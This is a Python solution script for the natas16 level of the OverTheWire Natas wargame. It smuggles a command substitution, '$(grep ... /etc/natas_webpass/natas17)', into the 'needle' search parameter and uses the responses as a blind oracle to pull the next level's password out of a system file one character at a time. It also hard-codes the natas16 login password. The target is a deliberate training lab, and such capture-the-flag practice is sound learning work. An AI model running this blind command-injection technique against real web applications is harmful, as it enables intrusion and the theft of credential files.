import requests
import time

vocab = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
used_chars = ''
natas16_pass = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
natas17_pass = ''
url = 'http://natas16:' + natas16_pass + '@natas16.natas.labs.overthewire.org/'

print("Searching \"%s\" for characters used in password....\n" %vocab)
for character in vocab:
	result = requests.get(url + '?needle=password$(grep ' + character + ' /etc/natas_webpass/natas17)&submit=Search')
	if result.content.find(b'password') < 0:
		used_chars += character

print("[*] Characters used in password: \"" + used_chars + "\"\n[*] Beginning brute-force attack using \"" + used_chars + "\" characters")
start = time.time()
for i in range(32):
	for character in used_chars:	
		result = requests.get(url +'?needle=password$(grep ^' + natas17_pass + character + ' /etc/natas_webpass/natas17)&submit=Search')
		if result.content.find(b'password') < 0:
			natas17_pass += character
			break
elapsed = (time.time() - start) / 60
print("[*] natas17 : %s\n\nTime elapsed: %f minutes." %(natas17_pass, elapsed))
